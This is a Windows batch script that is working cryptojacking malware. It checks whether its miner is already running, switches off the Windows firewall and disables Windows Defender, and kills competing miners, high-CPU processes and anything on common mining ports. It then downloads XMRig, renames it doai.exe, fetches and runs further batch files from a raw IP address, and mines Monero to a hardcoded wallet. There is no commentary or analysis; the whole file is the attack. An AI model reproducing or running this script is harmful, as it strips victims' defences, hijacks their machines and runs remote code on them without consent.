@echo off

set VERSION=1.0

tasklist | findstr /i "doai" > nul
if %errorlevel% == 0 (
  exit
)

netsh advfirewall set allprofiles state off
sc stop WinDefend
sc config WinDefend start= disabled

tasklist > %USERPROFILE%\temp.txt
for /f "tokens=1,2,3,4,5,6,7,8,9,10,11" %%a in ('findstr /i "CPU" %USERPROFILE%\temp.txt') do (
  set processName=%%b
  set cpuUsage=%%d
  if !cpuUsage! GTR 50 (
    taskkill /f /im !processName!
  )
)
del %USERPROFILE%\temp.txt

set "processNames=xmrig xmr-stak ccminer ethminer cgminer cpuminer sgminer bfgminer lolMiner xmr xig ddgs kworkerds hashfish"
for %%a in (!processNames!) do (
  tasklist | findstr /i "%%a" > nul
  if %errorlevel% == 0 (
    taskkill /f /im "%%a"
  )
)

set "ports=3333 4444 5555 7777 14444 5790 45700 2222 9999 20580 13531"
for %%p in (!ports!) do (
  netstat -a -b | findstr ":%%p" > %USERPROFILE%\temp.txt
  for /f "tokens=5 delims= " %%a in (%USERPROFILE%\temp.txt) do (
    set pid=%%a
  )
  if defined pid (
    taskkill /f /pid !pid!
  )
  del %USERPROFILE%\temp.txt
)
del %USERPROFILE%\temp.txt

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

move "%USERPROFILE%\c3pool\xmrig.exe" "%USERPROFILE%\c3pool\doai.exe"
set random_number=%RANDOM%
set doai_date=%date:~0,-3%

if errorlevel 1 (
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://107.173.101.73/keep.bat', '%USERPROFILE%\keep.bat')"
    "%USERPROFILE%\keep.bat"
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://107.173.101.73/moredoai.bat', '%USERPROFILE%\moredoai.bat')"
    "%USERPROFILE%\moredoai.bat"
) 

"%USERPROFILE%\c3pool\doai.exe" --donate-level 5 -o pool.supportxmr.com:443 -u 85YHd1PV3DAURaTqtoDy7GYPcaztBSf8NGhQz5MCUnpXXQVwzmHnkKzQC2guMsWHwd5cjDuDFsHKeTeLQsyELaTYFYrf5HG -k --tls -p doai_win%doai_date%_%random_number%
